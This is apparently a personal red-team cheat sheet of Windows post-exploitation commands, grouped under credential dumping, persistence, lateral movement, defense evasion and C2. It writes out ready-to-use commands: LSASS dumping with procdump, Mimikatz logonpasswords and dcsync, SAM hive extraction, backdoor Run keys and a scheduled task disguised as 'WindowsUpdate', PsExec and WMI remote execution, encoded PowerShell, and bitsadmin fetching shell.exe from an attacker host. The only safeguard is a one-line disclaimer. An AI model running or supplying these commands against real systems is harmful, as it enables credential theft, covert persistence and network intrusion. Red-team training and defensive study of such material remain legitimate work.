# Red Team Advanced Notes
**Author: Manish Verma**

---

## 📌 Objective
**Scope:** Advanced red team operations and simulation  
**Tools Used:** Metasploit, Cobalt Strike concepts, Custom scripts  
**Outcome:** Simulate real-world threat actor TTPs

---

## Credential Dumping

```bash
# LSASS dump (Windows)
# Via Task Manager → procdump.exe
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Mimikatz
sekurlsa::logonpasswords
sekurlsa::wdigest
lsadump::sam
lsadump::dcsync /user:administrator

# Reg save (offline)
reg save hklm\sam sam.hive
reg save hklm\system system.hive
secretsdump.py -sam sam.hive -system system.hive LOCAL
```

---

## Persistence Methods

```bash
# Registry Run keys
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\Windows\Temp\shell.exe"

# Scheduled Tasks
schtasks /create /tn "WindowsUpdate" /tr "C:\temp\shell.exe" /sc onlogon /ru System

# WMI Event Subscription (stealthy)
# See BloodHound for persistence paths

# Startup folder
copy shell.exe "C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
```

---

## Lateral Movement

```bash
# PsExec
PsExec.exe \\<IP> -u Administrator -p password cmd.exe

# WMI
wmic /node:<IP> /user:admin /password:pass process call create "cmd.exe /c whoami"

# PowerShell Remoting
Invoke-Command -ComputerName <IP> -Credential $cred -ScriptBlock { whoami }

# DCOM
[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","<IP>"))
```

---

## Defense Evasion

```bash
# Obfuscation
# PowerShell: Invoke-Obfuscation
# Base64 encode commands
$cmd = "whoami"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$b64 = [Convert]::ToBase64String($bytes)
powershell.exe -enc $b64

# AMSI Bypass (concept only)
# Memory patching techniques

# Living off the Land (LOLBins)
certutil.exe -decode encoded.txt shell.exe
bitsadmin /transfer job http://<IP>/shell.exe C:\temp\shell.exe
```

---

## C2 Overview

```
Metasploit → Basic C2, good for OSCP
Cobalt Strike → Enterprise red team (commercial)
Sliver → Open source C2 framework
Havoc → Modern open source C2

Key concepts:
- Beacon/Implant → Runs on victim
- Listener → Catches connections on attacker
- Stager → Small initial payload
- Payload staging → HTTP/HTTPS/DNS callbacks
```

---

## MITRE ATT&CK Mapping

```
T1059 - Command Execution
T1078 - Valid Accounts
T1110 - Brute Force
T1003 - Credential Dumping
T1055 - Process Injection
T1547 - Boot Autostart Execution
T1021 - Remote Services
```

---

## ⚠️ Disclaimer
All techniques for authorized red team operations only.
